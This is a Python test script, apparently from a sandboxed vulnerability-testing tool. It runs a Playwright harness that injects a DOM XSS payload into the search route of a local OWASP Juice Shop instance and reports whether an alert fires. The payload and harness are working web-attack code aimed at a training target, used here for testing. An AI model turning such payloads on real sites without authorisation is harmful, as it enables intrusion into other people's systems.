import json
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from src.sandbox.runner import SandboxRunner
from src.ingestion.schema import VulnClass

TEST_XSS_SCRIPT = """import json
from playwright.sync_api import sync_playwright

xss_fired = False

with sync_playwright() as p:
    browser = p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-dev-shm-usage"])
    page = browser.new_page()

    def handle_dialog(dialog):
        global xss_fired
        xss_fired = True
        try:
            dialog.dismiss()
        except Exception:
            pass

    page.on("dialog", handle_dialog)

    # Juice Shop DOM XSS via Angular SPA search hash route
    payload = '<iframe src="javascript:alert(1)">'
    import urllib.parse
    url = f"http://juiceshop:3000/#/search?q={urllib.parse.quote(payload)}"
    try:
        page.goto(url, wait_until="domcontentloaded", timeout=15000)
        page.wait_for_timeout(4000)
    except Exception as e:
        pass

    browser.close()

print(json.dumps({"completed": True, "xss_fired": xss_fired}))
"""

runner = SandboxRunner()
res = runner.run(TEST_XSS_SCRIPT, vuln_class=VulnClass.XSS)
print("Exit Code:", res.exit_code)
print("Duration:", res.duration_s)
print("Stdout:", res.stdout.strip())
if res.stderr.strip():
    print("Stderr:", res.stderr.strip())
